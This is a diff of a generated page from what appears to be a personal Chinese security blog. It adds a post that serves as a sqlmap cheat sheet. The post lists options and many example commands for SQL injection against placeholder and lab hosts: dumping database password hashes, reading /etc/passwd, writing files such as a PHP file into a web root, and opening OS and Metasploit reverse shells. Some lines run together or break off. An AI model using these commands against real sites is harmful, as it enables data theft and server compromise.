@@ -156,7 +156,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -167,7 +167,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -230,6 +230,167 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/28/sqlmap%E4%BD%BF%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/IMG_0010.JPG">
+      <meta itemprop="name" content="chenci">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chenci's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Chenci's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/28/sqlmap%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">sqlmap使用</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-28 12:00:25 / 修改时间：12:04:44" itemprop="dateCreated datePublished" datetime="2022-04-28T12:00:25+08:00">2022-04-28</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <ul>
+<li>-u  #注入点 </li>
+<li>-f  #指纹判别数据库类型 </li>
+<li>-b  #获取数据库版本信息 </li>
+<li>-p  #指定可测试的参数(?page&#x3D;1&amp;id&#x3D;2 -p “page,id”) </li>
+<li>-D “”  #指定数据库名 </li>
+<li>-T “”  #指定表名 </li>
+<li>-C “”  #指定字段 </li>
+<li>-s “”  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) </li>
+<li>–level&#x3D;(1-5) #要执行的测试水平等级，默认为1 </li>
+<li>–risk&#x3D;(0-3)  #测试执行的风险等级，默认为1 </li>
+<li>–time-sec&#x3D;(2,5) #延迟响应，默认为5 </li>
+<li>–data #通过POST发送数据 </li>
+<li>–columns        #列出字段 </li>
+<li>–current-user   #获取当前用户名称 </li>
+<li>–current-db     #获取当前数据库名称 </li>
+<li>–users          #列数据库所有用户 </li>
+<li>–passwords      #数据库用户所有密码 </li>
+<li>–privileges     #查看用户权限(–privileges -U root) </li>
+<li>-U               #指定数据库用户 </li>
+<li>–dbs            #列出所有数据库 </li>
+<li>–tables -D “”   #列出指定数据库中的表 </li>
+<li>–columns -T “user” -D “mysql”#列出mysql数据库中的user表的所有字段</li>
+<li>–dump-all            #列出所有数据库所有表 </li>
+<li>–exclude-sysdbs      #只列出用户自己新建的数据库和表 </li>
+<li>–dump -T “” -D “” -C “”   #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) </li>
+<li>–dump -T “” -D “” –start 2 –top 4  # 列出指定数据库的表的2-4字段的数据 </li>
+<li>–dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </li>
+<li>–os      #指定系统(Linux,Windows) </li>
+<li>-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。<br>  1.显示信息和警告消息。<br>  2：显示调试消息。<br>  3：有效载荷注入。<br>  4：显示HTTP请求。<br>  5：显示HTTP响应头。<br>  6：显示HTTP响应页面的内容 </li>
+<li>–privileges  #查看权限 </li>
+<li>–is-dba      #是否是数据库管理员 </li>
+<li>–roles       #枚举数据库用户角色 </li>
+<li>–udf-inject  #导入用户自定义函数（获取系统权限） </li>
+<li>–union-check  #是否支持union 注入 </li>
+<li>–union-cols #union 查询表记录 </li>
+<li>–union-test #union 语句测试 </li>
+<li>–union-use  #采用union 注入 </li>
+<li>–union-tech orderby #union配合order by </li>
+<li>–data “” #POST方式提交数据(–data “page&#x3D;1&amp;id&#x3D;2”) </li>
+<li>–cookie “用;号分开”      #cookie注入(–cookies&#x3D;”PHPSESSID&#x3D;mvijocbglq6pi463rlgk1e4v52; security&#x3D;low”) –referer “”     #使用referer欺骗(–referer “http:&#x2F;&#x2F;“) </li>
+<li>–user-agent “”  #自定义user-agent </li>
+<li>–proxy “<a href="http://127.0.0.1:8118&quot;">http://127.0.0.1:8118&quot;</a> #代理注入 </li>
+<li>–string&#x3D;””    #指定关键词,字符串匹配. </li>
+<li>–threads 　　  #采用多线程(–threads 3) </li>
+<li>–sql-shell    #执行指定sql命令 </li>
+<li>–sql-query    #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user &#x3D; ‘root’ LIMIT 0, 1” ) </li>
+<li>–file-read    #读取指定文件 </li>
+<li>–file-write   #写入本地文件(–file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt;将本地的test.txt文件写入到目标的1.txt) </li>
+<li>–file-dest    #要写入的文件绝对路径 </li>
+<li>–os-cmd&#x3D;id    #执行系统命令 </li>
+<li>–os-shell     #系统交互shell </li>
+<li>–os-pwn       #反弹shell(–os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;) </li>
+<li>–msf-path&#x3D;    #matesploit绝对路径(–msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;) </li>
+<li>–os-smbrelay  # </li>
+<li>–os-bof       # </li>
+<li>–reg-read     #读取win系统注册表 </li>
+<li>–priv-esc     # </li>
+<li>–time-sec&#x3D;    #延迟设置 默认–time-sec&#x3D;5 为5秒 -p “user-agent” –user-agent “sqlmap&#x2F;0.7rc1 (<a target="_blank" rel="noopener" href="http://sqlmap.sourceforge.net)&quot;/">http://sqlmap.sourceforge.net)&quot;</a>  #指定user-agent注入 </li>
+<li>–eta          #盲注 &#x2F;pentest&#x2F;database&#x2F;sqlmap&#x2F;txt&#x2F;common-columns.txt　　字段字典　　　<br>  common-outputs.txt<br>  common-tables.txt      表字典<br>  keywords.txt<br>  oracle-default-passwords.txt<br>  user-agents.txt<br>  wordlist.txt <h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2></li>
+</ul>
+<ol>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db –users –passwords –dbs -v 0 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –passwords -U root –union-use -v 2 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –dump -C “user,pass”  -v 1 –exclude-sysdbs </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –sql-shell -v 2 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –file-read “c:\boot.ini” -v 2 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt -v 2 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-cmd “id” -v 1 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-shell –union-use -v 2 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 –priv-esc -v 1 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 -v 1 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-bof –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 -v 1 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –reg-add –reg-key&#x3D;”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” –reg-value&#x3D;Test –reg-type&#x3D;REG_SZ –reg-data&#x3D;1 </li>
+<li>&#x2F;sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –eta </li>
+<li>&#x2F;sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</a> -p id –prefix “‘)” –suffix “AND (‘abc’&#x3D;’abc”16.&#x2F;sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</a> –auth-type Basic –auth-cred “testuser:testpass”17.&#x2F;sqlmap.py -l burp.log –scope&#x3D;”(www)?.target.(com|net|org)”18.&#x2F;sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</a> –tamper tamper&#x2F;between.py,tamper&#x2F;randomcase.py,tamper&#x2F;space2comment.py -v 3 </li>
+<li>&#x2F;sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</a> –sql-query “SELECT ‘foo’” -v 1 </li>
+<li>&#x2F;sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.129/mysql/get_int_4.php?id=1&quot;">http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</a> –common-tables -D testdb –banner </li>
+<li>&#x2F;sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.129/mysql/get_int_4.php?id=1&quot;">http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</a> –cookie&#x3D;”PHPSESSID&#x3D;mvijocbglq6pi463rlgk1e4v52; security&#x3D;low” –string&#x3D;’xx’ –dbs –level&#x3D;3 -p “uid”简单的注入流程 :</li>
+</ol>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ol>
+<li>读取数据库版本，当前用户，当前数据库<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db -v 1 </li>
+<li>判断当前数据库用户权限<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –privileges -U 用户名 -v 1<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –is-dba -U 用户名 -v 1 </li>
+<li>读取所有数据库用户或指定数据库用户的密码<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –users –passwords -v 2<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –passwords -U root -v 2 </li>
+<li>获取所有数据库<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dbs -v 2 </li>
+<li>获取指定数据库中的所有表<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –tables -D mysql -v 2 </li>
+<li>获取指定数据库名中指定表的字段<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –columns -D mysql -T users -v 2 </li>
+<li>获取指定数据库名中指定表中指定字段的数据<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2 </li>
+<li>file-read读取web文件<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-read “&#x2F;etc&#x2F;passwd” -v 2 </li>
+<li>file-write写入文件到web<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-write &#x2F;localhost&#x2F;mm.php –file使用sqlmap绕过防火墙进行注入测试：</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -266,7 +427,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-04-27 19:22:56" itemprop="dateModified" datetime="2022-04-27T19:22:56+08:00">2022-04-27</time>
+      <time title="修改时间：2022-04-27 21:27:56" itemprop="dateModified" datetime="2022-04-27T21:27:56+08:00">2022-04-27</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
